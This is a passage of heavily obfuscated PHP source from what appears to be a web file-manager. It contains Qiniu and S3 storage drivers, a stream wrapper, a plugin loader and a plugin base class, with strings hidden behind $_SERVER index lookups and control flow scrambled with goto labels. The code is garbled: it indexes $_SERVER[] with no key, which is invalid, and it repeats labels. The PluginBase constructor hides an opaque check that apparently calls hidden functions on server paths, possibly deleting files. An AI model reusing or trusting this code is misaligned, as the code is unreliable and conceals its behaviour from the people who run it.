$dБ[76]); } $f䰘 = array($dБ[28] => $this->pathThis($c), $dБ[75] => $this->getPathOuter($dБ[8] . $c), $dБ[29] => $dБ[76], $dБ[187] => 0, $dБ[107] => 0, $dБ[1178] => !0, $dБ[1179] => !0); goto Fّ; e呍: } public function listPath($E, $Dˣӵ = false) { goto Cԉ; Dӣ: $c = $f[33]; $eўڜ = 1000; $e塔 = $f[8]; goto b辩㹍; Cԉ: $f =& $_SERVER[]; $E = trim($E, $f[8]); $d = empty($E) ? $f[33] : $E . $f[8]; goto Dӣ; b辩㹍: $A = $b◼ = array(); while (!0) { list($D󫨲, $F) = $this->bucketManager->listFiles($this->bucket, $d, $c, $eўڜ, $e塔); if ($F) { return !1; } $c = array_key_exists($f[1199], $D󫨲) ? $c = $D󫨲[$f[1230]] : $f[33]; if (isset($D󫨲[$f[1234]])) { foreach ($D󫨲[$f[1234]] as $cꄟࢮ) { if ($cꄟࢮ == $d) { continue; } $A[] = $this->folderInfo($cꄟࢮ, $Dˣӵ); } } if (isset($D󫨲[$f[1231]])) { foreach ($D󫨲[$f[1231]] as $B̖) { if ($B̖[$f[89]] == $d) { continue; } $b◼[] = $this->fileInfo($B̖[$f[89]], $Dˣӵ, $B̖); } } if ($c == $f[33]) { break; } } return array($f[74] => $A, $f[73] => $b◼); goto f۟ͬ; f۟ͬ: } public function has($bׅʷ, $E = false, $Fǔ̐ = true) { goto Bܓ; Bܓ: $C =& $_SERVER[]; $bׅʷ = trim($bׅʷ, $C[8]); $d = empty($bׅʷ) ? $C[33] : $bׅʷ . $C[8]; goto bӰ; c㼜: $A߇҃ = 0; $f˥ = 0; while (!0) { list($eߌ, $A؞) = $this->bucketManager->listFiles($this->bucket, $d, $EЏۼ, $F媬, $dĽ); if ($A؞) { return !1; } $EЏۼ = array_key_exists($C[1199], $eߌ) ? $EЏۼ = $eߌ[$C[1230]] : $C[33]; if ($E) { if (!empty($eߌ[$C[1231]])) { $A߇҃ += count($eߌ[$C[1231]]); } if (!empty($eߌ[$C[1234]])) { $f˥ += count($eߌ[$C[1234]]); } if ($EЏۼ === $C[33]) { break; } continue; } if ($Fǔ̐) { if (!empty($eߌ[$C[1231]])) { return !0; } } else { if (!empty($eߌ[$C[1234]])) { return !0; } } if ($EЏۼ == $C[33]) { break; } } goto e; e: if ($E) { return array($C[191] => $A߇҃, $C[192] => $f˥); } return !1; goto eᓾ; bӰ: $EЏۼ = $C[33]; $F媬 = 1000; $dĽ = $C[8]; goto c㼜; eᓾ: } public function listAll($A؊̚) { $C☔ =& $_SERVER[]; $F¶ = $this->fileList($A؊̚, 1); $E­ = array(); foreach ($F¶ as $Cݎ) { $E­[$Cݎ[$C☔[28]]] = $Cݎ[$C☔[77]]; } return $this->listAllFiles($A؊̚, array_keys($E­), $E­); } public function canRead($E) { return $this->exist($E) ? !0 : !1; } public function canWrite($FӶҘ) { return $this->exist($FӶҘ) ? !0 : !1; } public function getContent($d) { return $this->fileSubstr($d, 0, -1); } public function setContent($c, $d = '') { $c = $this->tempFile($this->pathThis($c)); file_put_contents($c, $d); if ($this->upload($c, $c)) { $this->tempFileRemve($c); return !0; } return !1; } public function refreshUrls($f쭏) { goto aԅɹ; aԅɹ: $Fద =& $_SERVER[]; $d = array(); if (is_array($f쭏)) { foreach ($f쭏 as $Aԕ) { $d[] = $this->link($Aԕ); } } else { $d[] = $this->link($f쭏); } goto C; d: return $D[$Fద[1235]] == $Fద[715] ? !0 : !1; goto Dǩ; C: $f = new Qiniu\Cdn\CdnManager($this->auth); list($D, $e葾폐) = $f->refreshUrls($d); if ($e葾폐) { return !1; } goto d; Dǩ: } public function fileSubstr($F, $Dһ, $Fߟ) { $d޺ =& $_SERVER[]; if (!($b = $this->link($F))) { return !1; } $dȇ = !1; if ($Fߟ > 0) { $Fʟ = $Dһ + $Fߟ - 1; $dȇ = array($d޺[1236] . $Dһ . $d޺[412] . $Fʟ); } $f¨ = url_request($b, $d޺[216], !1, $dȇ); return $f¨[$d޺[708]] ? $f¨[$d޺[1049]] : !1; } public function upload($Aﻸ, $E, $E苺 = false, $d䈋 = REPEAT_REPLACE) { $d = new Qiniu\Storage\UploadManager(); $A̼ = $this->auth->uploadToken($this->bucket, $Aﻸ); $Bĥ = get_file_mime(get_path_ext($E)); list($E八, $c) = $d->putFile($A̼, $Aﻸ, $E, null, $Bĥ); return $c ? !1 : $this->getPathOuter($Aﻸ); } public function uploadFormData($Aɝ, $aŚ = 3600) { return $this->uploadToken($Aɝ, $aŚ); } public function multiUploadFormData($cȯ, $cǦʇ = 3600) { return $this->uploadToken($cȯ, $cǦʇ); } private function uploadToken($cߓ, $C鏩 = 3600) { goto Fר; bի: $A갺 = null; $CƂ􈶥 = $this->auth->uploadToken($this->bucket, $A갺, $BҠ, $E, !0); $dߥ = empty($this->region) || $this->region == $a[1239] ? $a[33] : $a[412] . $this->region; goto F; Fר: $a =& $_SERVER[]; $BҠ = $C鏩; $E = array($a[1237] => $a[1238]); goto bի; F: $FŸܘ = http_type() . "\x3a\x2f\x2f\165\x70\154\x6f\141\x64{$dߥ}\56\x71\151\x6e\x69\165\x70\56\x63\x6f\x6d\x2f"; return array($a[1240] => $CƂ􈶥, $a[1241] => $FŸܘ); goto fϢą; fϢą: } public function download($bɢ, $D̙Ɉ) { goto fɓ; fԸ: $A̋ = 1024 * 200; $F̠ = fopen($Aһѯ, $_SERVER[][1242]); while (!0) { $eǏݠ = $this->fileSubstr($bɢ, $c˾, $A̋); if ($eǏݠ === !1) { return !1; } fwrite($F̠, $eǏݠ); $c˾ += $A̋; if (strlen($eǏݠ) < $A̋) { break; } } goto f; fɓ: $Aһѯ = IO::getPathInner(IO::mkfile($D̙Ɉ)); if (!($DԦ = $this->link($bɢ))) { return !1; } $c˾ = 0; goto fԸ; f: fclose($F̠); return $D̙Ɉ; goto Eݬ; Eݬ: } public function link($B, $bӗܖ = '') { if (!$this->isFile($B)) { return !1; } $b׈ = $this->getHost() . $_SERVER[][8] . $this->pathEncode($B) . $bӗܖ; return $this->auth->privateDownloadUrl($b׈, 3600 * 12); } public function fileOut($dӈܿ, $EѶ = false, $C = false, $b = '') { $E駃 =& $_SERVER[]; if (!$C) { $C = $this->pathThis($dӈܿ); } $fëߊ = $EѶ ? $E駃[1243] . rawurlencode($C) : $E駃[33]; $bߒ = $this->link($dӈܿ, $fëߊ); $this->fileOutLink($bߒ); } public function fileOutServer($f, $a = false, $aɘ̭ = false, $Aٻ¸ = '') { parent::fileOut($f, $a, $aɘ̭, $Aٻ¸); } public function fileOutImage($fԑ, $d֘ = 250) { $aѱ = $this->link($fԑ, $_SERVER[][1244] . $d֘); $this->fileOutLink($aѱ); } public function fileOutImageServer($Dĸ¿, $c = 250) { parent::fileOutImage($Dĸ¿, $c); } public function hashMd5($e就) { $aضۧ =& $_SERVER[]; $Eߑ = $this->objectMeta($e就); return isset($Eߑ[$aضۧ[196]]) ? $Eߑ[$aضۧ[196]] : !1; $BӞ = $this->link($e就, $aضۧ[1245]); } public function size($eϕ) { $a󳭫 = $this->objectMeta($eϕ); return $a󳭫 ? $a󳭫[$_SERVER[][77]] : 0; } public function info($E͸) { if ($this->isFolder($E͸)) { return $this->folderInfo($E͸); } else { if ($this->isFile($E͸)) { return $this->fileInfo($E͸); } } return !1; } public function exist($d䇿) { return $this->isFile($d䇿) || $this->isFolder($d䇿); } public function isFile($B늂) { return !$this->isFolder($B늂) && $this->objectMeta($B늂); } public function isFolder($F) { return $this->cacheMethod($_SERVER[][223], $F); } protected function objectMeta($F) { return $this->cacheMethod($_SERVER[][224], $F); } protected function _objectMeta($cńù) { $aݣɐ =& $_SERVER[]; list($aٚЧ, $Fڛ) = $this->bucketManager->stat($this->bucket, $cńù); if ($aٚЧ) { $aٚЧ[$aݣɐ[77]] = intval($aٚЧ[$aݣɐ[1232]]); } return $aٚЧ; } protected function _isFolder($Bޗї) { $e =& $_SERVER[]; if ($Bޗї == $e[33] || $Bޗї == $e[8]) { return !0; } list($F̊, $EǙպ) = $this->bucketManager->listFiles($this->bucket, trim($Bޗї, $e[8]) . $e[8], $e[33], 1, $e[8]); return !empty($F̊[$e[1231]]) || !empty($F̊[$e[1234]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($c) { parent::__construct($c); } public function uploadFormData($Fݒ, $e = 3600) { goto D̰; Bڇ: $d = array($this->accessKey, $Fވ, $this->region, $Bݳ, $F⺟λ); $a = implode($f֘ޅ[8], $d); $c = array($f֘ޅ[1117] => gmdate($f֘ޅ[1116], strtotime($f֘ޅ[1153])), $f֘ޅ[1118] => array(array($f֘ޅ[1120] => $this->bucket), array($f֘ޅ[1119] => $ağ), array($f֘ޅ[1121], $f֘ޅ[1122], $f֘ޅ[33]), array($f֘ޅ[1121], $f֘ޅ[1154], $f֘ޅ[33]), array($f֘ޅ[1121], $f֘ޅ[1155], $f֘ޅ[33]), array($f֘ޅ[1123] => $b޽), array($f֘ޅ[1156] => $a), array($f֘ޅ[1157] => $eέ), array($f֘ޅ[1158] => $D֯䟡), array($f֘ޅ[1159] => $eѸ))); goto AН; A: $Bݳ = $f֘ޅ[59]; $D֯䟡 = gmdate($f֘ޅ[1151]); $Fވ = gmdate($f֘ޅ[709]); goto A; D̰: $f֘ޅ =& $_SERVER[]; $ağ = $f֘ޅ[185]; $eέ = $f֘ޅ[1150]; goto A; AН: $b = base64_encode(json_encode($c)); $D՟ = hash_hmac($f֘ޅ[1160], $Fވ, $f֘ޅ[1161] . $this->secret, !0); $c担 = hash_hmac($f֘ޅ[1160], $this->region, $D՟, !0); goto F; A: $F⺟λ = $f֘ޅ[1152]; $eѸ = $e . $f֘ޅ[33]; $b޽ = $f֘ޅ[1115]; goto Bڇ; cĬ: $B = array($f֘ޅ[199] => $f֘ޅ[33], $f֘ޅ[1162] => $f֘ޅ[33], $f֘ޅ[1119] => $ağ, $f֘ޅ[1123] => $b޽, $f֘ޅ[1127] => $b, $f֘ޅ[1163] => $a, $f֘ޅ[1164] => $eέ, $f֘ޅ[1165] => $D֯䟡, $f֘ޅ[1166] => $eѸ, $f֘ޅ[1167] => $Bڥ, $f֘ޅ[169] => $this->getHost()); return $B; goto Aȯ; F: $a = hash_hmac($f֘ޅ[1160], $Bݳ, $c担, !0); $bò = hash_hmac($f֘ޅ[1160], $F⺟λ, $a, !0); $Bڥ = hash_hmac($f֘ޅ[1160], $b, $bò); goto cĬ; Aȯ: } public function multiUploadFormData($C, $eϊӟ = 3600) { $E =& $_SERVER[]; $e۱ = gmdate($E[1246]); $c֢ = array(); $eº = $this->client->getUploadId($this->bucket, $C, $c֢); if (!$eº) { return !1; } return array($E[209] => $eº, $E[169] => $this->getHost() . $E[8] . $this->pathEncode($C), $E[210] => $e۱, $E[89] => $C); } public function multiUploadAuthData($Fό, $eߝʘ = array()) { goto C񎎙; aŢ鑭: if (strpos($C, $Eҭ[213]) === 0) { if (isset($FȆ[$Eҭ[1248]])) { $eߑ񖻞 = $FȆ[$Eҭ[1248]]; } else { if (isset($F[$Eҭ[1248]])) { $eߑ񖻞 = $F[$Eҭ[1248]]; } else { $eߑ񖻞 = hash($Eҭ[1160], $Eҭ[33]); } } return array($Eҭ[220] => $F[$Eҭ[220]], $Eҭ[1248] => $eߑ񖻞, $Eҭ[210] => $F[$Eҭ[1251]]); } return $F[$Eҭ[220]]; goto C; Dكҏ: $fɎ = $Eҭ[214]; $d = $Eҭ[8] . $this->pathEncode($eݩ) . $C; $F = $this->client->__getSignatureV4($FȆ, $f䌶, $fɎ, $d); goto aŢ鑭; A: if (isset($eߝʘ[$Eҭ[1247]])) { $FȆ[$Eҭ[1248]] = $eߝʘ[$Eҭ[1247]]; } $Aʲڜ = explode($Eҭ[171], $this->getHost()); $f䌶 = array($Eҭ[1249] => $Aʲڜ[1], $Eҭ[1250] => $Eҭ[33], $Eҭ[199] => $Eҭ[116], $Eҭ[1162] => $eߝʘ[$Eҭ[77]]); goto Dكҏ; B͵: unset($eߝʘ[$Eҭ[89]]); if (isset($eߝʘ[$Eҭ[211]])) { return $this->listUploadParts($eݩ, $eߝʘ); } $FȆ = array(); goto A; C񎎙: $Eҭ =& $_SERVER[]; $C = isset($eߝʘ[$Eҭ[160]]) ? $eߝʘ[$Eҭ[160]] : $Eҭ[33]; $eݩ = $eߝʘ[$Eҭ[89]]; goto B͵; C: } public function listUploadParts($d, $E􄜛 = array()) { goto bҋ; Aۦ񹙰: $AՉ = array($D[1249] => $dخ[1], $D[199] => $D[116], $D[1162] => strlen($DɷԢ)); $A = $D[212]; $fԧʺ = $D[8] . $this->pathEncode($d) . $E􄜛[$D[160]]; goto F; F: $bѺѝ = $this->client->__getSignatureV4($c޷, $AՉ, $A, $fԧʺ, $DɷԢ); return array($D[220] => $bѺѝ[$D[220]], $D[210] => $bѺѝ[$D[1251]], $D[222] => $Cˉ, $D[1248] => $bѺѝ[$D[1248]]); goto dºЍ; Eąތ: if (!$Cˉ) { return !1; } $DɷԢ = $D[1252]; foreach ($Cˉ as $F̈́) { $DɷԢ .= $D[1253] . "\74\x50\x61\162\164\116\x75\x6d\142\145\x72\76{$F̈́[$D[1204]]}\74\x2f\x50\x61\162\x74\x4e\x75\155\142\145\x72\x3e\12" . "\74\105\x54\x61\x67\x3e{$F̈́[$D[1205]]}\74\x2f\x45\x54\141\x67\x3e\12" . $D[1254]; } goto E; E: $DɷԢ .= $D[1255]; $c޷ = array(); $dخ = explode($D[171], $this->getHost()); goto Aۦ񹙰; bҋ: $D =& $_SERVER[]; $f = str_replace($D[221], $D[33], $E􄜛[$D[160]]); $Cˉ = $this->client->listParts($this->bucket, $d, $f); goto Eąތ; dºЍ: } public function link($D, $C = array()) { return parent::link($D, $C); } public function fileOut($Dڢ, $bڿĚ = false, $EԐ = false, $b݅ = '') { if (strstr($this->endpoint, $_SERVER[][1256])) { return parent::fileOutServer($Dڢ, $bڿĚ, $EԐ, $b݅); } parent::fileOut($Dڢ, $bڿĚ, $EԐ, $b݅); } public function fileOutImage($Bⷠ, $CȔ = 250) { if (strstr($this->endpoint, $_SERVER[][1256])) { return parent::fileOutImageServer($Bⷠ, $CȔ); } parent::fileOutImage($Bⷠ, $CȔ); } public function fileOutLink($F蓰) { $DȜڭ =& $_SERVER[]; if (substr($F蓰, 0, 7) == $DȜڭ[1130]) { $F蓰 = $DȜڭ[1131] . substr($F蓰, 7); } header($DȜڭ[156] . $F蓰); die; } public function getHost() { $d =& $_SERVER[]; $b = str_rtrim(parent::getHost(), $d[8] . $this->bucket); $b = explode($d[171], $b); return $b[0] . $d[171] . $this->bucket . $d[91] . $b[1]; } } goto F籏; F: function Action($cұ = '') { goto cɖ; b: if (isset($Eĉٓ[$Fו])) { return $Eĉٓ[$Fו]; } $cұ = trim(str_replace($aƯҩ[4], $aƯҩ[5], $cұ), $aƯҩ[4]); $Fَ = explode($aƯҩ[5], $cұ); goto Aز; Aز: $F = strtolower($Fَ[0]); if (substr($F, -6) == $aƯҩ[6]) { $cұ = substr($Fَ[0], 0, -6); $e߷ = $cұ . $aƯҩ[7]; $c컖 = $aƯҩ[8]; if (isset($Fَ[1]) && substr(strtolower($Fَ[1]), -5) == $aƯҩ[9]) { $e߷ = $cұ . $Fَ[1]; $c컖 = $aƯҩ[10] . $Fَ[1] . $aƯҩ[11]; } else { if (count($Fَ) == 3) { $e߷ = $cұ . $Fَ[1] . $Fَ[2]; $c컖 = $aƯҩ[12] . $Fَ[1] . $aƯҩ[13] . $Fَ[2] . $aƯҩ[11]; } } $c컖 = PLUGIN_DIR . $cұ . $aƯҩ[4] . $c컖; } else { if (substr($F, -5) == $aƯҩ[9]) { $cұ = substr($Fَ[0], 0, -5); return Model($cұ); } else { $e߷ = $Fَ[0] . $Fَ[1]; $c컖 = CONTROLLER_DIR . $Fَ[0] . $aƯҩ[4] . $Fَ[1] . $aƯҩ[14]; } } $bމ = strtolower($e߷); goto bՊ; cɖ: $aƯҩ =& $_SERVER[͒]; static $Eĉٓ = array(); $Fו = $cұ; goto b; bՊ: if (isset($Eĉٓ[$bމ])) { return $Eĉٓ[$bމ]; } if (is_file($c컖)) { include_once $c컖; } if (!class_exists($e߷)) { return actionCallError("\x5b{$cұ}\40\75\76\40{$e߷}\x5d\40\x63\x6c\x61\163\163\40\x6e\x6f\x74\40\x65\170\x69\163\164\x73\x21"); } goto c; c: $Eĉٓ[$bމ] = new $e߷(); $Eĉٓ[$Fו] = $Eĉٓ[$bމ]; return $Eĉٓ[$bމ]; goto D荤ǵ; D荤ǵ: } function ActionApply($Fķ̥, $a = array()) { goto b҆; b҆: if (is_array($Fķ̥)) { return call_user_func_array($Fķ̥, $a); } if (function_exists($Fķ̥)) { return call_user_func_array($Fķ̥, $a); } $AÍ = strrpos($Fķ̥, $_SERVER[͒][5]); goto cݍü; a鋔: if (!method_exists($Fǹخ׋, $DŻ)) { return actionCallError("{$Fķ̥}\40\x6d\145\x74\150\x6f\x64\x20\x6e\157\x74\x20\145\x78\x69\x73\x74\163\41"); } $A僋 = call_user_func_array(array($Fǹخ׋, $DŻ), $a); return $A僋; goto c; cݍü: $B򮽇 = substr($Fķ̥, 0, $AÍ); $DŻ = substr($Fķ̥, $AÍ + 1); $Fǹخ׋ = Action($B򮽇); goto a鋔; c: } function actionCallError($Aȯ) { $d񇽱 =& $_SERVER[͒]; $BحǇ = json_encode_force(array($d񇽱[15] => this_url(), $d񇽱[16] => $GLOBALS[$d񇽱[16]])); $BحǇ = str_replace(array($d񇽱[17]), array($d񇽱[4]), $BحǇ); return write_log($Aȯ . $d񇽱[18] . $BحǇ, $d񇽱[19]); } goto F; B: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($c, $D슭 = '') { goto D懄ݑ; D懄ݑ: $this->info = $this->info($c); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[][75]]; goto cר; Fڢ: return $this->info ? !0 : !1; goto A񍛋; cר: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$c])) { self::$_chunkBuffer[$c] = array(); } goto Fڢ; A񍛋: } function stream_read($e) { $Bݸ = $this->fileSubstr($this->pose, $e); $this->pose += strlen($Bݸ); return $Bݸ; } public function stream_tell() { return $this->pose; } public function stream_seek($eệ, $D鱰ԉ) { $E =& $_SERVER[]; if ($D鱰ԉ == SEEK_SET) { $this->pose = $eệ; } else { if ($D鱰ԉ == SEEK_CUR) { $this->pose += $eệ; } else { if ($D鱰ԉ == SEEK_END) { $this->pose = $this->info[$E[77]] + intval($eệ); } } } if ($eệ < 0) { $this->pose = $this->info[$E[77]] + $eệ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[][77]]; } public function stream_close() { return !0; } public function url_stat($aԗě, $dČ) { $bǢ =& $_SERVER[]; $aĒ = $this->info($aԗě); return array($bǢ[1306] => 0, $bǢ[1307] => 0, $bǢ[12] => 32768 + 511, $bǢ[1308] => 0, $bǢ[1309] => 0, $bǢ[1310] => 0, $bǢ[1311] => 0, $bǢ[77] => $aĒ[$bǢ[77]], $bǢ[1312] => $aĒ[$bǢ[1184]], $bǢ[1270] => $aĒ[$bǢ[107]], $bǢ[1269] => $aĒ[$bǢ[187]], $bǢ[1313] => 0, $bǢ[1314] => 0); } static $fileInfo = array(); public function info($f޷) { $dʧ = $_SERVER[][1315]; if (isset(self::$fileInfo[$f޷])) { return self::$fileInfo[$f޷]; } if (substr($f޷, 0, strlen($dʧ)) != $dʧ) { return !1; } self::$fileInfo[$f޷] = IO::info(substr($f޷, strlen($dʧ))); return self::$fileInfo[$f޷]; } public static function read($A֮, $Fڅ, $cܾ) { goto C׉; A: $bգƃ = 0; while ($bգƃ < $cܾ) { $eǌ = min($Dς, $cܾ - $bգƃ); $bˍګ .= fread($C˖, $eǌ); $bգƃ += $eǌ; } fclose($C˖); goto E; C׉: $c =& $_SERVER[]; $C˖ = fopen($A֮, $c[1186]); if (!$C˖) { return $c[33]; } goto CǷ; E: return $bˍګ; goto A㳊ߣ; CǷ: $Dς = 8192; fseek($C˖, $Fڅ, SEEK_SET); $bˍګ = $c[33]; goto A; A㳊ߣ: } public function fileSubstr($E˕, $f̎) { goto AЏ; bӄ: if ($E˕ + $f̎ > $f̂͹) { $f̎ = $f̂͹ - $E˕; } if ($f̎ <= 0) { return $Dԅ[33]; } if ($E˕ < 0 || $E˕ >= $f̂͹ || $f̎ <= 0 || $f̎ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\106\151\x6c\145\122\145\x61\144\40\145\162\162\157\162\41\40\163\x74\x61\x72\x74\75{$E˕}\73\154\x65\x6e\x67\164\150\75{$f̎}\x3b\40\x73\151\172\x65\75{$f̂͹}\x3b"); } goto E吨; AЏ: $Dԅ =& $_SERVER[]; $f̂͹ = $this->info[$Dԅ[77]]; $d = $E˕; goto e; Dە: foreach ($dǺ淅 as $E撄؜ => $Dɢڞ) { $E撄؜ = intval($E撄؜); $Aڳበ = $E撄؜ + strlen($Dɢڞ); if ($E˕ >= $Aڳበ) { continue; } if ($E˕ >= $E撄؜ && $E˕ + $f̎ <= $Aڳበ) { return substr($Dɢڞ, $E˕ - $E撄؜, $f̎); } break; } if (count($dǺ淅) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($Dԅ[1316], $Dԅ[1317] . count($dǺ淅) . "\73\163\x74\x61\x72\x74\x3d{$E˕}\54\154\x65\156\147\164\150\75{$f̎}\73\160\157\163\x65\x3a{$E撄؜}\176{$Aڳበ}"); throw new Exception($Dԅ[1318]); } $fﺾ = intval($E˕ / $dĠֻ) * $dĠֻ; goto Aܻґ; Aܻґ: $dϢ = ceil(($E˕ + $f̎) / $dĠֻ) * $dĠֻ - $fﺾ; $D优 = IO::fileSubstr($this->path, $fﺾ, $dϢ); $dǺ淅[$fﺾ . $Dԅ[33]] = $D优; goto eÇ; e: $CӉ = $f̎; if ($E˕ < 0) { $E˕ = $f̂͹ + $E˕; } if ($f̎ === !1) { $f̎ = $f̂͹ - $E˕; } goto bӄ; eÇ: ksort($dǺ淅); $Eȃ = substr($D优, $E˕ - $fﺾ, $f̎); return $Eȃ; goto Dڔ; E吨: $dĠֻ = 64 * 1024; $dǺ淅 =& self::$_chunkBuffer[$this->path]; if (!$dǺ淅) { $dǺ淅 = array(); } goto bԞ; bԞ: $E撄؜ = 0; $Aڳበ = 0; $Dɢڞ = $Dԅ[33]; goto Dە; Dڔ: } private function log($eѸ, $DÏ) { $c =& $_SERVER[]; $Bި = timeFloat() - $this->timeStart; write_log(sprintf($c[1319], $eѸ, $this->info[$c[28]], $Bި, $DÏ), $c[1235]); } } class Message { function __construct() { } public function send($f˝ = '', $Bޫ̂ = array(), $cӭŨ = "\x74\145\x78\x74") { goto fˮа; c: $Bޫ̂ = array($eÂی[986] => isset($Bޫ̂[$eÂی[986]]) ? $Bޫ̂[$eÂی[986]] : $eÂی[33], $eÂی[535] => isset($Bޫ̂[$eÂی[535]]) ? $Bޫ̂[$eÂی[535]] : $eÂی[33]); if (empty($f˝) || empty($Bޫ̂[$eÂی[986]]) && empty($Bޫ̂[$eÂی[535]])) { return !1; } $CǞ = array($eÂی[1262] => $D, $eÂی[1322] => $Bޫ̂); goto E֩; fˮа: $eÂی =& $_SERVER[]; $D = array($eÂی[29] => $eÂی[1320], $eÂی[711] => $f˝); if (in_array($cӭŨ, array($eÂی[1320], $eÂی[1321]))) { $D[$eÂی[29]] = $cӭŨ; } goto c; E֩: Hook::trigger($eÂی[1323], $CǞ); goto Aճ; Aճ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto Bʰ; E܄έ: $this->pluginName = str_replace($DƘ[1326], $DƘ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $DƘ[8]; $this->pluginApi = appHostGet() . $DƘ[1327] . $this->pluginName . $DƘ[8]; goto bɩ; cЊ : return $this; goto e˚ڄ; E͏: if ($AÜ && strpos($DƘ[47] . $AÜ . $DƘ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$DƘ[1330]] . $this->pluginName . $DƘ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto cЊ ; Bʰ: $DƘ =& $_SERVER[]; if ($_SERVER[$DƘ[700]] != $_SERVER[$DƘ[1324]]) { goto F㈟; f: $B⽝ = $e؍($d؏Ɗ); $f׿ = explode($DƘ[217], $B⽝); if (count($f׿) < $DƘ[566]) { $e = $DƘ[704]; $e(); } goto e׏؎; BÚ: $A֍ = 1; while ($A֍ > 1) { $A֍ = $A֍ + 4; $BƩꠄ = rawurlencode($A֍ . $DƘ[361]); } goto AҒ; F㈟: $eܚ = $DƘ[807]; $e؍ = $DƘ[701]; $d؏Ɗ = $_SERVER[$DƘ[702]] . $DƘ[703]; goto f; e׏؎: $b۰ = $DƘ[808]; $b۰($_SERVER[$DƘ[809]]); $b۰($_SERVER[$DƘ[702]] . $DƘ[1325]); goto BÚ; AҒ: } global $in, $config; goto F̽ߏ٬; bɩ: $this->pluginHost = $config[$DƘ[1328]] . $this->pluginName . $DƘ[8]; $this->pluginHostDefault = $config[$DƘ[1328]] . $this->pluginName . $DƘ[8]; $AÜ = $config[$DƘ[1329]]; goto E͏; F̽ߏ٬: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($DƘ[1326]); goto E܄έ; e˚ڄ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[][1331]); } protected function assign($CƱ, $F = false) { if (is_array($CƱ)) { $this->values = array_merge($this->values, $CƱ); } else { $this->values[$CƱ] = $F; } } protected function display($Dʶ) { extract($this->values); require $Dʶ; } final function hookRegist($cڍ) { $this->modelPlugin->appRegist($this->pluginName, $cڍ); } final function appIcon() { $Cǎ =& $_SERVER[]; $eɽ = $this->appPackage(); $BɆ = $Cǎ[33]; if (isset($eɽ[$Cǎ[382]])) { if (isset($eɽ[$Cǎ[382]][$Cǎ[1332]])) { $BɆ = $Cǎ[1333] . $eɽ[$Cǎ[382]][$Cǎ[1332]] . $Cǎ[1334]; } else { if ($eɽ[$Cǎ[382]][$Cǎ[1335]]) { $BɆ = $Cǎ[1336] . $eɽ[$Cǎ[382]][$Cǎ[1335]] . $Cǎ[1337]; } } } return $BɆ; } final function fileCanView($dɰ) { goto bĮϓ; bĮϓ: $E =& $_SERVER[]; if (request_url_safe($dɰ)) { return !0; } if ($this->isShare($dɰ)) { return !0; } goto DĂ; DĂ: $a䌋ǉ = Session::get($E[1338]); if (!$a䌋ǉ || !$a䌋ǉ[$E[1339]]) { $B = $E[1340] . rawurlencode(this_url()); show_tips(LNG($E[1341]) . $E[1342] . $B . $E[1343] . LNG($E[1344]) . $E[1345], !1); } if (!Action($E[1346])->authCan($E[1347])) { show_tips(LNG($E[1348]) . $E[1349], !1); } goto AӉɵ; AӉɵ: ActionCall($E[1350], $dɰ); goto CႵ; CႵ: } final function isShare($dȐ) { $bϐ = KodIO::parse($dȐ); return $bϐ[$_SERVER[][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($C׬­) { if (request_url_safe($C׬­)) { return $C׬­; } if (!$this->isShare($C׬­)) { $C׬­ = $this->filePath($C׬­); } return Action($_SERVER[][1033])->linkOut($C׬­); } public function filePathLinkOut($cۢǣ) { if (request_url_safe($cۢǣ)) { return $cۢǣ; } $this->fileCanView($cۢǣ); return Action($_SERVER[][1033])->link($cۢǣ); } final function filePath($d) { $e쭿 =& $_SERVER[]; if ($D = $this->checkSharePath($d)) { return $D; } $this->fileCanView($d); if (request_url_safe($d)) { $aއ = parse_url_query($d); if (isset($aއ[$e쭿[1351]]) && isset($aއ[$e쭿[197]])) { $aǕÍ = Model($e쭿[1103])->get($e쭿[1352]); $B˰ = Mcrypt::decode($aއ[$e쭿[197]], $aǕÍ); if ($B˰) { $this->fileInfo = IO::infoWithChildren($B˰); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $B˰; } } $d = $this->_cacheHttpFile($d); $this->fileInfo = IO::infoWithChildren($d); } else { $this->fileInfo = IO::infoWithChildren($d); if (!$this->fileInfo) { show_tips(LNG($e쭿[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $d; } final function _cacheHttpFile($C) { $eᙽ = hash_path($C, !0); $this->cachePath = $this->pluginCachePath($eᙽ); if ($d݊ψ = IO::fileNameExist($this->cachePath, $eᙽ)) { return KodIO::make($d݊ψ); } $Eґ = $this->cachePath . $eᙽ; return $this->pluginCacheFileSet($Eґ, file_get_contents($C)); } final function _tmpFileName($cƈ = array()) { goto bٯ; F: $C̾ = array($cƈ[$Fĉ[28]], $cƈ[$Fĉ[75]], $cƈ[$Fĉ[77]]); if (isset($cƈ[$Fĉ[459]])) { $C̾[] = $cƈ[$Fĉ[459]]; } return md5(implode($Fĉ[70], $C̾)); goto f; bٯ: $Fĉ =& $_SERVER[]; if (!$cƈ) { $cƈ = $this->fileInfo; } if (isset($cƈ[$Fĉ[164]])) { return $cƈ[$Fĉ[164]]; } goto CҒ; CҒ: if (isset($cƈ[$Fĉ[162]][$Fĉ[164]])) { return $cƈ[$Fĉ[162]][$Fĉ[164]]; } $bǹ = IO::hashSimple($cƈ[$Fĉ[75]]); if ($bǹ) { return $bǹ; } goto F; f: } final function checkSharePath($D) { goto A; A: $EȜ =& $_SERVER[]; if (!defined($EȜ[427])) { define($EȜ[1353], 0); } if (!$this->isShare($D)) { return !1; } goto e; eƬ: 